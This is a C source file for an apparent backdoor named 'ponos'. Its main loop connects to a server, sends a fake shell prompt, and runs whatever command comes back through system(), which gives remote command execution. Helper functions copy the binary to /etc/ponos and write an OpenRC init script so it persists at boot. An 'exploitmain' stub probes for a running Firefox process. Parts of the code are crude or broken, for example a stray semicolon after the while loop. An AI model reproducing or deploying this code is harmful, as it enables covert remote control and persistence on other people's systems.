#include <stdio.h>
#include <unistd.h>
#include <stdlib.h> 
#include <libgen.h>
#include <string.h>
#include <netdb.h> 
#include <arpa/inet.h>
#include <netinet/in.h> 
#include <stdlib.h> 
#include <sys/socket.h>
#include <sys/types.h> 
#include <unistd.h>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr

int sockfd, connfd;

void sendtoserver(char message[]) {
	char buff[MAX];

	write(sockfd, message, strlen(message));
	read(sockfd, buff, sizeof(buff));
	system(buff);
}

int cpexecfile(char *fname) {
	char command[100];
	sprintf(command, "cp %s /etc/ponos", fname);
	system(command);
}

int checkforautorun()
{
	if (fopen("/etc/init.d/ponos","r") == NULL) {
		FILE *file;
		file = fopen("/etc/init.d/ponos", "w");
        fprintf(file, "#!/sbin/openrc-run\n\n");
        fprintf(file, "name='ponos'\n");
        fprintf(file, "description='This script runs ponos'\n");
        fprintf(file, "command='/etc/ponos'\n");
        fprintf(file, "pidfile='/var/run/ponos.pid'\n\n");
        fprintf(file, "depend() {\n");
        fprintf(file, "    need localmount\n");
        fprintf(file, "}\n\n");
        fprintf(file, "start() {\n");
        fprintf(file, "    start-stop-daemon --start --quiet --background --make-pidfile --pidfile $pidfile --exec $command\n");
        fprintf(file, "}\n\n");
        fprintf(file, "stop() {\n");
        fprintf(file, "    start-stop-daemon --stop --quiet --pidfile $pidfile\n");
        fprintf(file, "}\n");
        fclose(file);

		system("chmod +x /etc/init.d/ponos");
		
		//system("rc-update add ponos default");

		return(1);
		}
	else {
	return(0);
	}
}

void exploitmain() {
	FILE *fp;
    char path[10000];
	fp = popen("ps aux", "r");
	while (fgets(path, sizeof(path)-1, fp) != NULL);
		if (strstr(path, "firefox"))
			pclose(fp);
			system("ls");
	memset(path, 0, sizeof(path));
	pclose(fp);
}

int main(int argc, char *argv[]) {
	struct sockaddr_in servaddr, cli;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1)
		printf("socket creation failed\n");
	else
		printf("app socket created\n");
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0)
		printf("connection with the server failed...\n");
	else
		printf("connected to a server");
	while (1) {
		sendtoserver("cvirusfakesh >");
	}
}
